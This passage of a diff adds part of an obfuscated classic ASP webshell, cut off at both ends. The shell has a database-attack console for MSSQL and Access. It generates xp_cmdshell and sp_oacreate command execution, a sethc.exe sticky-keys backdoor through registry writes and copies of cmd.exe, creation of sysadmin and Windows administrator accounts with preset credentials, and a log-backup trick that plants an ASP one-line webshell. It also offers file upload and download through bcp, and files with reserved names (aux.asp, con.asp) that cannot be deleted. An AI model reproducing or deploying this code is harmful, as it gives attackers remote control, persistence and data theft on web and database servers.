+jfd "nwwj","",10
+echo"<td>"
+kbae"skj",1,"Move myself there","onclick='javascript:document.getElementById(""nwwj"").disabled=this.checked'"
+echo"</td>"
+potex
+sffh 1
+echo"<td>"
+rhnww"fileName","100%",""
+ihxbe"aux.asp","aux.asp"
+ihxbe"con.asp","con.asp"
+ihxbe"com1.asp","com1.asp"
+ihxbe"com2.asp","com2.asp"
+ihxbe"nul.asp","nul.asp"
+ihxbe"prn.asp","prn.asp"
+zkdl
+echo"</td>"
+nuauc"<td colspan='2'>Cannot del,cannot open in ordinary way,this will drive the web administrator madness :)</td>"
+potex
+ymw
+cmj
+vres
+End Sub
+Sub itob()
+If Not lslt Then On Error Resume Next
+If kpc=""Then kpc=Request.Cookies(xvnzo&"kpc")
+bcy()
+If kpc<>""Then
+Select Case ydoho
+Case"ichf"
+ichf()
+Case"yyjd"
+yyjd()
+Case"fclwc"
+fclwc()
+Case"kbpxz","ytx"
+smeby()
+Case Else
+nqj()
+End Select
+End If
+vwrt
+vres
+End Sub
+Sub bcy()
+Dim rs,nhmkc,coia,dpgv
+If Not lslt Then On Error Resume Next
+lyau("Database Operation")
+nef True
+nuauc"Connect String : "
+bcnd"text","kpc",kpc,160,""
+echo" "
+iajgq"OK"
+cmj
+xstrw"GetConnectString",True
+ahwr"100%"
+sffh 1
+doTd"SqlOleDb","10%"
+nuauc"<td style=""width:80%"">Server:"
+bcnd"text","MsServer","127.0.0.1","15",""
+echo" Username:"
+bcnd"text","MsUser","sa","10",""
+echo" Password:"
+bcnd"text","MsPass","","10",""
+echo" DataBase:"
+bcnd"text","DBPath","","10",""
+echo"</td>"
+vkrju"button","","Generate","10%","onClick=""javascript:xcnub(MsServer.value,MsUser.value,MsPass.value,DBPath.value)""",""
+potex
+sffh 0
+doTd"Jet",""
+nuauc"<td>DB path:"
+bcnd"text","accdbpath",qnvke&"\","82",""
+echo"</td>"
+vkrju"button","","Generate","10%","onClick=""javascript:ssiy(accdbpath.value)""",""
+potex
+ymw
+echo"</span><hr>"
+If Err Then Err.clear
+If kpc<>""Then
+qws kpc
+Response.Cookies(xvnzo&"kpc")=kpc
+Set rs=zkew("Ado"&pgjme&"db.R"&ura&"ecordSet")
+rs.Open "select @@version,db_name()",conn,1,1
+If Err Then
+ycqmn="access"
+Err.clear
+Set rs=Nothing
+Set rs=zkew("Ado"&pgjme&"db.R"&ura&"ecordSet")
+rs.Open "select cstr('access')",conn,1,1
+If Err Then
+ycqmn="others"
+Err.clear
+End If
+rs.Close
+Set rs=Nothing
+Else
+fkxwm=rs(0)
+rwhai=rs(1)
+rs.close
+ycqmn="mssql"
+%>
+<script language=vbscript>
+Function ahzl(path)
+Dim enlg,svy,ekrk
+enlg=saqv(path,"\",True)
+path=Mid(path,Len(enlg)+2)
+ekrk=rqv(path,"\")
+svy=saqv(path,"\",False)
+ahzl=Array(enlg,svy,ekrk)
+End Function
+Function ppaum(ctupr)
+form2.mmz.value="exec ma"&bckx&"ster..xp_cmdshell '"&ctupr&"'"
+End Function
+Function zvt(svy)
+Dim xel
+xel=ahzl(svy)
+form2.mmz.value="exec ma"&bckx&"ster..xp_regread '"&xel(0)&"','"&xel(1)&"','"&xel(2)&"'"
+End Function
+Function uirpk(yfi)
+form2.mmz.value="exec ma"&bckx&"ster..xp_dirtree '"&yfi&"',1,1"
+End Function
+Function fmg(ioh,ejun,abmc)
+If abmc=2 Then
+form2.mmz.value="If object_id('dark_temp')is not null drop table dark_temp;create table dark_temp(aa nvarchar(4000));bulk insert dark_temp from'"&ejun&"'"
+Else
+form2.mmz.value="declare @a int;exec ma"&bckx&"ster..sp_oacrea"&zgkx&"te'WScri"&msn&"pt.Sh"&qvef&"ell',@a output;exec ma"&bckx&"ster..sp_oa"&qtlkz&"method @a,'run',null,'"&ioh&" > "&ejun&"',0,'true'"
+End If
+End Function
+Function ujp(jazc,kgu,fwkud,qde)
+Select Case qde
+Case 1
+form2.mmz.value="exec ma"&bckx&"ster..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFT"&japw&"WARE\Microsoft\Jet\4.0\Engin"&pkm&"es','SandBoxM"&twmez&"ode','REG_DWORD',0"
+Case 2
+jazc=Replace(jazc,"""","""""")
+form2.mmz.value="Select * From openrow"&chqrp&"Set('Microsoft.Jet.OLEDB.4.0',';Database="&kgu&"','select shell("""&jazc&" > "&fwkud&""")')"
+Case 3
+form2.mmz.value="If object_id('dark_temp')is not null drop table dark_temp;create table dark_temp(aa nvarchar(4000));bulk insert dark_temp from'"&fwkud&"'"
+End Select
+End Function
+Function mlq(nbja,qqecv)
+form2.mmz.value="declare @a int;exec ma"&bckx&"ster..sp_oacrea"&zgkx&"te'Scripti"&kwaa&"ng.FileS"&voli&"ystemObject',@a output;exec ma"&bckx&"ster..sp_oa"&qtlkz&"method @a,'CopyFile',null,'"&nbja&"','"&qqecv&"'"
+End Function
+Function ubfsr(daw,bxim)
+form2.mmz.value="exec ma"&bckx&"ster..xp_makecab 'C:\windows\temp\~098611.tmp','default',1,'"&daw&"';exec ma"&bckx&"ster..xp_unpackcab 'C:\windows\temp\~098611.tmp','"&saqv(bxim,"\",False)&"',1,'"&rqv(bxim,"\")&"'"
+End Function
+Function umwe(mnxhc,vni)
+form2.mmz.value="Use ma"&bckx&"ster;dbcc addextEnd"&jqf&"edproc('"&mnxhc&"','"&vni&"')"
+End Function
+Function yhvu(jyeno)
+form2.mmz.value="Use ma"&bckx&"ster;dbcc dropextEndedproc('"&jyeno&"')"
+End Function
+Function vertm(rcv)
+form2.mmz.value="EXEC ma"&bckx&"ster..sp_configure 'show advanced options',1;RECONFIGURE;EXEC ma"&bckx&"ster..sp_configure '"&rcv&"',1;RECONFIGURE"
+End Function
+Function tlll(mzz,svn,buemo)
+Dim xel
+xel=ahzl(mzz)
+form2.mmz.value="exec ma"&bckx&"ster..xp_regwrite '"&xel(0)&"','"&xel(1)&"','"&xel(2)&"','"&svn&"','"&buemo&"'"
+End Function
+Function qiso(name,pass)
+form2.mmz.value="exec ma"&bckx&"ster..sp_addlogin '"&name&"','"&pass&"';exec ma"&bckx&"ster..sp_addsrvrolememb"&dvt&"er '"&name&"','sysadmin'"
+End Function
+Function kqmx(name,pass)
+form2.mmz.value="declare @a int;exec ma"&bckx&"ster..sp_oacrea"&zgkx&"te 'ScriptControl',@a output;exec ma"&bckx&"ster..sp_oas"&kmh&"etproperty @a,'language','VBScript';exec ma"&bckx&"ster..sp_oa"&qtlkz&"method @a,'addcode',null,'sub add():Set o=CreateObject(""She"&uqc&"ll.Users""):Set u=o.create("""&name&"""):u.ChangePas"&bas&"sword """&pass&""","""":u.setting(""AccountType"")=3:end sub';exec ma"&bckx&"ster..sp_oa"&qtlkz&"method @a,'run',null,'add'"
+End Function
+Function dlm(othrm,nzax,rwhai,ygxjn)
+Select Case ygxjn
+Case 1
+form2.mmz.value="alter database "&rwhai&" Set recovery full;dump transaction "&rwhai&" with no_log;If object_id('dark_temp')is not null drop table dark_temp;create table dark_temp(aa sql_variant primary key)"
+Case 2
+form2.mmz.value="backup database "&rwhai&" to disk='C:\windows\temp\~098611.tmp' with init"
+Case 3
+form2.mmz.value="insert dark_temp values('"&Replace(othrm,"'","''")&"')"
+Case 4
+form2.mmz.value="backup log "&rwhai&" to disk='"&nzax&"';drop table dark_temp"
+End Select
+End Function
+Function mhkmt(rwhai)
+On Error Resume Next
+Dim ccsi,dcfki
+Set ccsi=new RegExp
+ccsi.Global=True
+ccsi.IgnoreCase=True
+ccsi.MultiLine=True
+ccsi.Pattern="(Database|Initial Catalog) *=[^;]+"
+If ccsi.test(sqlForm.kpc.value)Then
+sqlForm.kpc.value=ucdn(ccsi.Replace(sqlForm.kpc.value,"$1="&rwhai))
+sqlForm.ydoho="nqj"
+sqlForm.submit
+Else
+Window.alert("Can not get database name in connect string!")
+End If
+End Function
+Function saqv(str,oztli,tskgs)
+If str="" Or InStr(str,oztli)<1 Then
+saqv=""
+Exit Function
+End If
+If tskgs Then
+saqv=Left(str,InStr(str,oztli)-1)
+Else
+saqv=Left(str,InstrRev(str,oztli)-1)
+End If
+End Function
+Function rqv(str,oztli)
+If str="" Or InStr(str,oztli)<1 Then
+rqv=""
+Exit Function
+End If
+rqv=Mid(str,InstrRev(str,oztli)+Len(oztli))
+End Function
+</script>
+<%
+End If
+If ydoho="ichf"And mmz=""Then
+If ycqmn="others"Then
+mmz="select * from "&upt
+Else
+mmz="select * from ["&upt&"]"
+End If
+End If
+euk "nqj","","","","","Show Tables",""
+echo"<br>"
+nef True
+tpdyo"ydoho","ichf"
+tpdyo"kpc",kpc
+ahwr"100%"
+If ycqmn="mssql"Then
+sffh 1
+nuauc"<td colspan=3>Version : "&vaiy(fkxwm)&"</td>"
+potex
+nhmkc="sysadmin|db_owner|public"
+sffh 0
+echo"<td colspan=3>"
+For Each strrole In Split(nhmkc,"|")
+If strrole="sysadmin"Then
+rs.Open "select IS_SRVROLEMEMBER('"&strrole&"')",conn,1,1
+Else
+rs.Open "select IS_ROLEMEMBER('"&strrole&"')",conn,1,1
+End If
+If rs(0)=1 Then
+echo "Current ServerRole : <font color='red'>"&strrole&"</font> "
+rs.close
+Exit For
+End If
+rs.close
+Next
+echo "| Switch Database : "
+rs.Open "select name from ma"&bckx&"ster..sysdatabases",conn,1,1
+rs.movefirst
+Do While Not rs.eof
+echo "<a href=javascript:mhkmt('"&rs("name")&"')>"&rs("name")&"</a> | "
+rs.movenext
+Loop
+echo"</td></tr>"
+ukcm
+rs.close
+Set rs=Nothing
+End If
+sffh 1
+doTd"Execute Sql","10%"
+jfd"mmz",mmz,5
+vkrx"Submit","10%"
+potex
+ymw
+cmj
+If ycqmn="mssql"Then
+echo"Functions : "
+coia=Split("xp_cmd|xp_dir|xp_reg|xp_regw|wsexec|sbexec|fsocopy|makecab|addproc|delproc|enfunc|addlogin|addsys|logback|kbpxz|ytx","|")
+dpgv=Split("xp_cmdshell|xp_dirtree|xp_regread|xp_regwrite|ws exec|sandbox exec|FSO copy|Cab copy|add procedure|del procedure|enable function|add sql user|add sys user|logbackup|saupfile|sadownfile","|")
+For i=0 To UBound(coia)
+echo"<a href='#' onClick=""javascript:xppp("&coia(i)&")"" class='hidehref'>"&dpgv(i)&"</a> | "
+Next
+echo"<br><br>"
+fcmxc"xp_cmd",True
+ahwr"100%"
+sffh 1
+doTd"comm"&zuwfd&"and","10%"
+vkrju"text","ctupr","net "&ufan&"user","80%","",""
+vkrju"button","","Generate","10%","onClick=""javascript:ppaum(ctupr.value)""",""
+potex
+ymw
+echo"</span>"
+fcmxc"xp_dir",True
+ahwr"100%"
+sffh 1
+doTd"Path","10%"
+vkrju"text","yfi",qnvke,"80%","",""
+vkrju"button","","Generate","10%","onClick=""javascript:uirpk(yfi.value)""",""
+potex
+ymw
+echo"</span>"
+fcmxc"xp_reg",True
+ahwr"100%"
+sffh 1
+doTd"Path","10%"
+vkrju"text","xpregpath","HKEY_LOCAL_MACHINE\SYSTEM\CurrentContr"&ozgne&"olSet\Control\Compu"&jzcfx&"terName\Compu"&jzcfx&"terName\Compu"&jzcfx&"terName","80%","",""
+vkrju"button","","Generate","10%","onClick=""javascript:zvt(xpregpath.value)""",""
+potex
+ymw
+echo"</span>"
+fcmxc"xp_regw",True
+ahwr"100%"
+sffh 1
+doTd"Path","10%"
+vkrju"text","mzz","HKEY_LOCAL_MACHINE\SOFT"&japw&"WARE\Microsoft\Windows"&mvt&" NT\Current"&fadf&"Version\Image File Execution Options\Sethc.exe\debugger","80%","","4"
+potex
+sffh 0
+doTd"Type",""
+vkrju"text","svn","REG_SZ","30%","",""
+doTd"Value",""
+vkrju"text","buemo","cmd.exe","40%","",""
+vkrju"button","","Generate","10%","onClick=""javascript:tlll(mzz.value,svn.value,buemo.value)""",""
+potex
+ymw
+echo"</span>"
+fcmxc"wsexec",True
+ahwr"100%"
+sffh 1
+doTd"comm"&zuwfd&"and","10%"
+vkrju"text","ioh","cmd /c net "&ufan&"user","","","4"
+potex
+sffh 0
+doTd"Temp File",""
+vkrju"text","ejun","C:\WINDOWS\Temp\~098611.tmp","50%","",""
+doTd"Step","20%"
+echo"<td width='10%'>"
+rhnww"abmc","100%",""
+ihxbe 1,1
+ihxbe 2,2
+zkdl
+echo"</td>"
+vkrju"button","","Generate","10%","onClick=""javascript:fmg(ioh.value,ejun.value,abmc.value)""",""
+potex
+ymw
+echo"</span>"
+fcmxc"sbexec",True
+ahwr"100%"
+sffh 1
+doTd"comm"&zuwfd&"and","10%"
+vkrju"text","jazc","cmd /c net "&ufan&"user","","","5"
+potex
+sffh 0
+doTd"Mdb Path",""
+vkrju"text","kgu","C:\windows\syste"&zpvb&"m32\ias\ias.mdb","30%","",""
+doTd"Temp File","10%"
+vkrju"text","fwkud","C:\WINDOWS\Temp\~098611.tmp","30%","",""
+echo"<td width='10%'>Step "
+rhnww"qde","40px",""
+ihxbe 1,1
+ihxbe 2,2
+ihxbe 3,3
+zkdl
+echo"</td>"
+vkrju"button","","Generate","10%","onClick=""javascript:ujp(jazc.value,kgu.value,fwkud.value,qde.value)""",""
+potex
+ymw
+echo"</span>"
+fcmxc"fsocopy",True
+ahwr"100%"
+sffh 1
+doTd"Source","10%"
+vkrju"text","nbja","C:\WINDOWS\syste"&zpvb&"m32\cmd.exe","35%","",""
+doTd"Target","10%"
+vkrju"text","qqecv","C:\WINDOWS\syste"&zpvb&"m32\Sethc.exe","35%","",""
+vkrju"button","","Generate","10%","onClick=""javascript:mlq(nbja.value,qqecv.value)""",""
+potex
+ymw
+echo"</span>"
+fcmxc"makecab",True
+ahwr"100%"
+sffh 1
+doTd"Source","10%"
+vkrju"text","daw","C:\WINDOWS\syste"&zpvb&"m32\cmd.exe","35%","",""
+doTd"Target","10%"
+vkrju"text","bxim","C:\WINDOWS\syste"&zpvb&"m32\Sethc.exe","35%","",""
+vkrju"button","","Generate","10%","onClick=""javascript:ubfsr(daw.value,bxim.value)""",""
+potex
+ymw
+echo"</span>"
+fcmxc"addproc",True
+ahwr"80%%"
+sffh 1
+doTd"Procedure","20%"
+echo"<td width='20%'>"
+rhnww"mnxhc","100%",""
+ihxbe "xp_cmdshell","xp_cmdshell"
+ihxbe "xp_dirtree","xp_dirtree"
+ihxbe "xp_regread","xp_regread"
+ihxbe "xp_regwrite","xp_regwrite"
+ihxbe "sp_oacrea"&zgkx&"te","sp_oacrea"&zgkx&"te"
+zkdl
+doTd"DLL","20%"
+echo"<td width='20%'>"
+rhnww"vni","100%",""
+ihxbe "xpl"&ldc&"og70.dll","xpl"&ldc&"og70.dll"
+ihxbe "xpstar.dll","xpstar.dll"
+ihxbe "odsole70.dll","odsole70.dll"
+zkdl
+vkrju"button","","Generate","20%","onClick=""javascript:umwe(mnxhc.value,vni.value)""",""
+potex
+ymw
+echo"</span>"
+fcmxc"delproc",True
+ahwr"40%"
+sffh 1
+doTd"Procedure","30%"
+echo"<td width='40%'>"
+rhnww"jyeno","100%",""
+ihxbe "xp_cmdshell","xp_cmdshell"
+ihxbe "xp_dirtree","xp_dirtree"
+ihxbe "xp_regread","xp_regread"
+ihxbe "xp_regwrite","xp_regwrite"
+ihxbe "sp_oacrea"&zgkx&"te","sp_oacrea"&zgkx&"te"
+zkdl
+echo"</td>"
+vkrju"button","","Generate","30%","onClick=""javascript:yhvu(jyeno.value)""",""
+potex
+ymw
+echo"</span>"
+fcmxc"enfunc",True
+ahwr"40%"
+sffh 1
+doTd"Function","30%"
+echo"<td width='40%'>"
+rhnww"rcv","100%",""
+ihxbe "xp_cmdshell","xp_cmdshell"
+ihxbe "Ole Automation Procedures","sp_oacrea"&zgkx&"te"
+ihxbe "Ad Hoc Distributed Queries","openrow"&chqrp&"Set"
+zkdl
+echo"</td>"
+vkrju"button","","Generate","30%","onClick=""javascript:vertm(rcv.value)""",""
+potex
+ymw
+echo"</span>"
+fcmxc"addlogin",True
+ahwr"80%"
+sffh 1
+doTd"Username","10%"
+vkrju"text","addusername","Bloodsword$","30%","",""
+doTd"Password","10%"
+vkrju"text","adduserpass","0kee","30%","",""
+vkrju"button","","Generate","20%","onClick=""javascript:qiso(addusername.value,adduserpass.value)""",""
+potex
+ymw
+echo"</span>"
+fcmxc"addsys",True
+ahwr"80%"
+sffh 1
+doTd"Username","10%"
+vkrju"text","sysname","Bloodsword$","30%","",""
+doTd"Password","10%"
+vkrju"text","syspass","0kee","30%","",""
+vkrju"button","","Generate","20%","onClick=""javascript:kqmx(sysname.value,syspass.value)""",""
+potex
+ymw
+echo"</span>"
+fcmxc"logback",True
+ahwr"100%"
+sffh 1
+doTd"Content","10%"
+echo"<td colspan='4'>"
+wfpk"othrm","<%response.clear:execute request(""value""):response.End%"&">","100%",5,""
+echo"</td>"
+vkrju"button","","Generate","10%","onClick=""javascript:dlm(othrm.value,nzax.value,logdb.value,logstep.value)""",""
+potex
+sffh 0
+doTd"Path","10%"
+vkrju"text","nzax",rumla(".")&"\system.asp","40%","",""
+doTd"Database","10%"
+vkrju"text","logdb",rwhai,"20%","",""
+doTd"Step","10%"
+echo"<td width='10%'>"
+rhnww"logstep","100%",""
+ihxbe 1,1
+ihxbe 2,2
+ihxbe 3,3
+ihxbe 4,4
+zkdl
+echo"</td>"
+potex
+ymw
+echo"</span>"
+fcmxc"kbpxz",True
+nuauc"<form method=""post"" id=""saform""action="""&djdla&"""enctype=""multipart/form-data"">"
+tpdyo"goaction",goaction
+tpdyo"ydoho","kbpxz"
+tpdyo"kpc",kpc
+ahwr"100%"
+sffh 1
+vkrju"file","smeby","","30%","",""
+nuauc"<td align='right'>Save as(full path):</td>"
+vkrju"text","godj","","40%","",""
+vkrju"button","","Upload","10%","onClick=""javascript:iajgq('"&goaction&"','smeby','')""",""
+potex
+ymw
+cmj
+echo"</span>"
+fcmxc"ytx",True
+nef True
+tpdyo"ydoho","ytx"
+tpdyo"kpc",kpc
+ahwr"100%"
+sffh 1
+doTd"Remoto file(full path)",""
+vkrju"text","rlbgp","","30%","",""
+doTd"Save as",""
+vkrju"text","godj",qnvke,"30%","",""
+vkrx"Download","10%"
+potex
+ymw
+cmj
+echo"</span>"
+End If
+echo"<hr>"
+End If
+End Sub
+Sub yyjd()
+If Not lslt Then On Error Resume Next
+If ycqmn<>"others" Then upt="["&upt&"]"
+conn.Execute"drop table "&upt,-1,&H0001
+If Err Then
+goql(Err)
+Else
+avivi("Table deleted.")
+End If
+nqj()
+End Sub
+Sub fclwc()
+If Not lslt Then On Error Resume Next
+If ycqmn<>"others" Then upt="["&upt&"]"
+Dim rs
+Set rs=conn.Execute("select * from "&upt,-1,&H0001)
+fegof(Err)
+If rs.Fields.Count>0 Then
+Response.Clear
+Session.CodePage=936
+Response.AddHeader"Content-Disposition","Attachment; Filename="&upt&".xls"
+Session.CodePage=65001
+Response.AddHeader"Content-Type","application / ms - excel"
+echo"<table border=1><tr>"
+For i=0 To rs.Fields.Count-1
+echo"<td><b>"&rs.Fields(i).Name&"</b></td>"
+Next
+echo"</tr>"
+Do Until rs.EOF
+echo"<tr>"
+For i=0 To rs.Fields.Count-1
+echo"<td>"&vaiy(rs(i))&"</td>"
+Next
+echo"</tr>"
+rs.MoveNext
+Loop
+echo"</table>"
+Else
+avivi"It's empty."
+nqj()
+vres
+End If
+rs.Close
+Set rs=Nothing
+response.End
+End Sub
+Sub smeby()
+puf="8.0|1|1       SQLIMAGE      0       {size}       """"                        1     binfile     """"|"
+conn.execute "If object_id('dark_temp')is not null drop table dark_temp"
+If InStr(fkxwm,"Microsoft SQL Server 2005")>0 Then
+puf=Replace(puf,"8.0","9.0")
+conn.execute("EXEC ma"&bckx&"ster..sp_configure 'show advanced options', 1;RECONFIGURE;EXEC ma"&bckx&"ster..sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
+End If
+If ydoho="ytx"Then
+Dim rs,size
+If godj=""Or rlbgp="" Then
+avivi"Not enough parameters."
+nqj()
+vres
+ElseIf InstrRev(rlbgp,".")<InstrRev(rlbgp,"\")Then
+avivi"You can't download a folder -_-~!"
+nqj()
+vres
+ElseIf InstrRev(godj,".")<InstrRev(godj,"\")Then
+godj=godj&"\"&rqv(rlbgp,"\")
+End If
+Set rs=zkew("Ado"&pgjme&"db.R"&ura&"ecordSet")
+Set rs=conn.execute("EXEC ma"&bckx&"ster..xp_cmdshell 'dir """&rlbgp&""" | find """&rqv(rlbgp,"\")&"""'",-1,&H0001)
+rs.movefirst
+size=Replace(Trim(urnj(rs(0)," [0-9,]+ ",False)(0)),",","")
+If size=""Or Not IsNumeric(size)Then
+avivi("Get size error.")
+vres
+End If
+puf=Replace(puf,"{size}",size)
+rs.Close
+Set rs=Nothing
+Else
+puf=Replace(puf,"{size}",0)
+End If
+eypgt=Split(puf,"|")
+For Each substrfrm In eypgt
+conn.execute("EXEC ma"&bckx&"ster..xp_cmdshell 'echo "&substrfrm&" >>c:\tmp.fmt'")
+Next
+If ydoho="kbpxz"Then
+qhv()
+Else
+eerrs()
+End If
+conn.execute "If object_id('dark_temp')is not null drop table dark_temp"
+conn.execute("EXECUTE ma"&bckx&"ster..xp_cmdshell 'del c:\tmp.fmt'")
+nqj()
+End Sub
+Sub qhv()
+If Not lslt Then On Error Resume Next
+Dim rs,theFile,eypgt,ffssu
+If godj="" Then godj=qnvke
+If InStr(godj,":")<1 Then godj=qnvke&"\"&godj
+Set theFile=okw.File("smeby")
+If InstrRev(godj,"\")>InstrRev(godj,".")Then godj=godj&"\"&theFile.FileName
+conn.execute "CREATE TABLE [dark_temp] ([id] [int] NULL ,[binfile] [Image] NULL) ON [PRIMARY] TEXTIMAGE_ON [PRIMARY];"
+Set rs=zkew("Ado"&pgjme&"db.R"&ura&"ecordSet")
+rs.Open "SELECT * FROM dark_temp where id is null",conn,1,3
+rs.AddNew
+rs("binfile").AppendChunk theFile.fkv()
+rs.Update
+conn.execute("exec ma"&bckx&"ster..xp_cmdshell'bcp ""select binfile from "&rwhai&"..dark_temp"" queryout """&godj&""" -T -f c:\tmp.fmt'")
+set rs=conn.execute("EXECUTE ma"&bckx&"ster..xp_fileexist '"&godj&"'")
+If Err Then
+goql(Err)
+ElseIf rs(0)=1 Then 
+avivi("File uploaded, have fun.")
+Else
+avivi("Upload failed, RPWT?")
+End If
+rs.close
+Set rs=Nothing
+End Sub
+Sub eerrs()
+Dim rs
+If Not lslt Then On Error Resume Next
+conn.execute "CREATE TABLE [dark_temp] ([binfile] [Image] NULL)"
+conn.execute("exec ma"&bckx&"ster..xp_cmdshell'bcp """&rwhai&"..dark_temp"" in """&rlbgp&""" -T -f c:\tmp.fmt'")
+Set rs=zkew("Ado"&pgjme&"db.R"&ura&"ecordSet")
+rs.Open "select * from dark_temp",conn,1,1
+dlbgc godj,rs(0),1
+If Err Then
+goql(Err)
+Else
+avivi("File downloaded,have fun.")
+End If
+rs.close
+Set rs=Nothing
+End Sub
+Sub nqj()
+Dim prk,ewiw,ngda,iokvn,jkury,sye
+If Not lslt Then On Error Resume Next
+jkury=1
+xgr=0
+Set sye=conn.OpenSchema(20,Array(Empty,Empty,Empty,"table"))
+fegof(Err)
+Do Until sye.Eof
+lzwq jkury
+auxb"<b>"&sye("Table_Name")&"</b>"
+echo"<label>"
+euk "ichf","","",sye("Table_Name"),"","Show content",""
+echo"</label>"
+echo"<label>"
+euk "showStructure","","",sye("Table_Name"),"","Show structure",""
+echo"</label>"
+echo"<label>"
+euk "fclwc","","",sye("Table_Name"),"","Export",""
+echo"</label>"
+echo"<label>"
+euk "yyjd","","",sye("Table_Name"),"","Delete",""
+echo"</label>"
+If ydoho="showStructure"And upt=sye("Table_Name")Then
+Set rsColumn=conn.OpenSchema(4,Array(Empty,Empty,sye("Table_Name").value))
+echo"<span>"
+echo"<center>"
+ahwr"80%"
+sffh xgr
+ukcm
+doTd"Name",""
+doTd"Type",""
+doTd"Size",""
+doTd"Nullable",""
+potex
+Do Until rsColumn.Eof
+ngda=rsColumn("Character_Maximum_Length")
+If ngda="" Then ngda=rsColumn("Is_Nullable")
+sffh xgr
+doTd rsColumn("Column_Name"),""
+doTd nvkq(rsColumn("Data_Type")),""
+doTd ngda,""
+doTd rsColumn("Is_Nullable"),""
+potex
+ukcm
+rsColumn.MoveNext
+Loop
+ymw
+echo"</center></span>"
+End If
+nuauc"<br></span>"
+ukcm
+jkury=jkury+1
+If jkury=2 Then jkury=0
+sye.MoveNext
+Loop
+Set sye=Nothing
+Set rsColumn=Nothing
+goql(Err)
+End Sub
+Sub ichf()
+Dim i,j,x,rs,Cat,mchd,chs,vzamc,iaz
+If Not lslt Then On Error Resume Next
+Set Cat=zkew("ADOX.Catalog")
+Cat.ActiveConnection=conn.ConnectionString
+Set rs=zkew("Ado"&pgjme&"db.R"&ura&"ecordSet")
+If Lcase(Left(mmz,7))="select " And ycqmn<>"others" Then
+If bvo=""Then bvo=1
+rs.Open mmz,conn,1,1
+fegof(Err)
+bvo=CInt(bvo)
+rs.PageSize=vpusk
+If Not rs.Eof Then
+rs.AbsolutePage=bvo
+End If
+If rs.Fields.Count > 0 Then
+echo"<table width='100%' cellspacing='0' border='0' style='border-width:0px;border-collapse:collapse;'>"
+sffh 1
+For j=0 To rs.Fields.Count-1
+vhkz vaiy(rs.Fields(j).Name)
+Next
+potex
+xgr=0
+For i=1 To rs.PageSize
+If rs.Eof Then Exit For
+sffh xgr
+For j=0 To rs.Fields.Count-1
+vhkz vaiy(rs(j))
+Next
+potex
+ukcm
+rs.MoveNext
+Next
+End If
+sffh xgr
+vzamc=rs.RecordCount/vpusk
+If InStr(vzamc,".")>0 Then vzamc=Int(vzamc)+1
+echo"<td colspan="&rs.Fields.Count&">"
+nuauc rs.RecordCount&" records in total,page "&vzamc
+euk "ichf","","",upt,"1","&laquo;",vaiy(" ")
+iaz=""
+If upt=""Then iaz=Replace(mmz,"'","\'")
+For i=1 To vzamc
+If i=bvo Then
+echo vaiy(" "&i&" ")
+Else
+echo vaiy(" ")
+euk "ichf","",iaz,upt,i,i,vaiy(" ")
+End If
+Next
+echo vaiy(" ")
+euk "ichf","",iaz,upt,vzamc,"&raquo;",""
+echo"</td>"
+potex
+ymw
+rs.Close
+Else
+Set rs=conn.Execute(mmz,-1,&H0001)
+fegof(Err)
+If rs.Fields.Count>0 Then
+ahwr"100%"
+sffh 1
+For i=0 To rs.Fields.Count-1
+vhkz vaiy(rs.Fields(i).Name)
+Next
+potex
+xgr=0
+Do Until rs.EOF
+sffh xgr
+For i=0 To rs.Fields.Count-1
+vhkz vaiy(rs(i))
+Next
+potex
+rs.MoveNext
+ukcm
+Loop
+ymw
+rs.Close
+Else
+avivi"Query got null recordSet."
+End If
+Set rs=Nothing
+Set Cat=Nothing
+End If
+goql(Err)
+End Sub
+Sub qws(kpc)
+If Not lslt Then On Error Resume Next
+Set conn=zkew("Ado"&pgjme&"db.Conne"&kvcfz&"ction")
+conn.Open kpc
+fegof(Err)
+End Sub
+Sub vwrt()
+If Not lslt Then On Error Resume Next
+If IsObject(conn)Then
+conn.Close
+Set conn=Nothing
+End If
+End Sub
+Function nvkq(flag)
+Dim str
+Select Case flag
+Case 0: str="EMPTY"
+Case 2: str="SMALLINT"
+Case 3: str="INTEGER"
+Case 4: str="SINGLE"
+Case 5: str="DOUBLE"
+Case 6: str="CURRENCY"
+Case 7: str="DATE"
+Case 8: str="BSTR"
+Case 9: str="IDISPATCH"
+Case 10: str="ERROR"
+Case 11: str="BIT"
+Case 12: str="VARIANT"
+Case 13: str="IUNKNOWN"
+Case 14: str="DECIMAL"
+Case 16: str="TINYINT"
+Case 17: str="UNSIGNEDTINYINT"
+Case 18: str="UNSIGNEDSMALLINT"
+Case 19: str="UNSIGNEDINT"
+Case 20: str="BIGINT"
+Case 21: str="UNSIGNEDBIGINT"
+Case 72: str="GUID"
+Case 128: str="BINARY"
+Case 129: str="CHAR"
+Case 130: str="VARCHAR"
+Case 131: str="NUMERIC"
+Case 132: str="USERDEFINED"
+Case 133: str="DBDATE"
+Case 134: str="DBTIME"
+Case 135: str="DBTIMESTAMP"
+Case 136: str="CHAPTER"
+Case 200: str="WCHAR"
+Case 201: str="TEXT"
+Case 202: str="NVARCHAR"
+Case 203: str="NTEXT"
+Case 204: str="VARBINARY"
+Case 205: str="LONGVARBINARY"
+Case Else: str=flag
+End Select
+nvkq=str
+End Function
+Sub mkp()
+If Not lslt Then On Error Resume Next
+Dim theFile,wnd,ckkx,lhuiq
+If Right(godj,1)="\"Then
+avivi"Can't edit a directory!"
+vres
+End If
+ckkx=saqv(godj,"\",False)
+nef True
+If goaction="jmed"And ydoho="mkp" Then
+wnd=izawx(godj)
+Else
+wnd=xehxe(godj)
+End If
+goql(Err)
+wfpk"nwwj",wnd,"100%","25",""
+If ydoho="eqk" Then
+tpdyo"ydoho","rdeb"
+Else
+tpdyo"ydoho","save"
+End If
+echo"Save as :"
+bcnd"text","godj",godj,"60",""
+echo" Encode:"
+rhnww"act","80px","onchange=""javascript:if(this.value!=''){iajgq('"&goaction&"',this.value,'"&djfri(godj)&"');}"""
+ihxbe"mkp","Default"
+lhuiq="<option value=""eqk"" {$}>Utf-8</option>"
+If ydoho="eqk" Then
+lhuiq=Replace(lhuiq,"{$}","selected")
+End If
+echo lhuiq
+zkdl
+echo" "
+iajgq"Save"
+echo" "
+bcnd"reSet","","ReSet","",""
+echo" "
+bcnd"button","clear","Clear","","onClick=""javascript:this.form.nwwj.innerText=''"""
+echo" "
+bcnd"button","","Go back","","onClick=""javascript:iajgq('"&goaction&"','','"&djfri(ckkx)&"')"""
+cmj
+goql(Err)
+vres
+End Sub
+Sub wei()
+If Not lslt Then On Error Resume Next
+If goaction="jmed"And ydoho="save" Then
+rwha godj,nwwj
+Else
+dlbgc godj,nwwj,2
+End If
+If Err Then
